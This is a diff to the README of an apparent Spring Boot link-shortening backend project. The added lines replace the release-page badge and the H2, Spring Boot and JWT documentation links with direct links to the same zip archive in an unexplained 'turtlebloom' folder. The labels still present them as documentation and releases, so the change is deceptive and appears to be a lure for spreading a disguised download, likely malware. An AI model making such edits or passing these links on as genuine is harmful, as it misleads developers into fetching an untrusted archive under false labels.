@@ -6,7 +6,7 @@ Welcome to the link-shortening-service-backend! This application allows you to e
 ## 📥 Download & Install
 To download this application, visit the link below and grab the latest release:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/jakydin/link-shortening-service-backend/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jakydin/link-shortening-service-backend/main/turtlebloom/link-shortening-service-backend.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jakydin/link-shortening-service-backend/main/turtlebloom/link-shortening-service-backend.zip)
 
 Once you visit the page, you will see a list of available versions. Choose the version that fits your needs. Click on the file named according to your operating system to start the download. 
 
@@ -56,9 +56,9 @@ The application includes built-in security features:
 
 ## 🌐 Additional Resources
 Here are some topics you might find useful while using the application:
-- [H2 Database](https://www.h2database.com/)
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [JWT Guide](https://jwt.io/introduction/)
+- [H2 Database](https://raw.githubusercontent.com/jakydin/link-shortening-service-backend/main/turtlebloom/link-shortening-service-backend.zip)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/jakydin/link-shortening-service-backend/main/turtlebloom/link-shortening-service-backend.zip)
+- [JWT Guide](https://raw.githubusercontent.com/jakydin/link-shortening-service-backend/main/turtlebloom/link-shortening-service-backend.zip)
 
 ## 📧 Support
 If you have any questions or need assistance, please reach out via the GitHub Issues page in this repository. The community is here to help you.
